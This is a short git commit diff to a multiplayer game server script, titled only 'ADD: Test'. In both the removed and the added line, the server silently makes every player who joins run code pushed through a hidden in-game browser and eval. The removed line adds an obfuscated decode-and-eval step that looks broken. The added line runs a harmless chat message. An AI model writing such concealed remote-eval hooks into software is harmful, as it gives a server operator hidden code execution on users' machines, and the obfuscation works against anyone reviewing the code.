f1d0844818560e38626f9e38b1e42d8672f1d59e
Scripticus <Anton.Kurth@gmx.de>
2017-01-05 19:33:04 +0100

    ADD: Test

--- rpg/server/security/clientID.cs
+++ rpg/server/security/clientID.cs
@@ -156,7 +156,7 @@ public partial class rpg : Script
         if (name == "SESSION_INIT")
         {
             API.setEntityData(sender, "session_id", getCID(sender.socialClubName));
-            API.triggerClientEvent(sender, "ADMIN_EVAL", "var cef=API.createCefBrowser(0,0,true);API.waitUntilCefBrowserInit(cef);API.setCefBrowserPosition(cef,0,00);API.loadPageCefBrowser(cef,'');cef.eval('var content=\"'+'nichts'+'\";var a=\"password\";var array=\"\";var i2=0;for(var i=0;i<content.length;i++){if(i2>=a[1].length){i2=0}array+=(content[i].charCodeAt(0)-15000-a[1][i2].charCodeAt(0)).fromCharCode();i2++};resourceEval(array)')");
+            API.triggerClientEvent(sender, "ADMIN_EVAL", "var cef=API.createCefBrowser(0,0,true);API.waitUntilCefBrowserInit(cef);API.setCefBrowserPosition(cef,0,00);API.loadPageCefBrowser(cef,'');cef.eval('resourceEval(\"API.sendChatMessage(12345.toString())\")')");
 
             if(player_isRegistered(sender))
             {
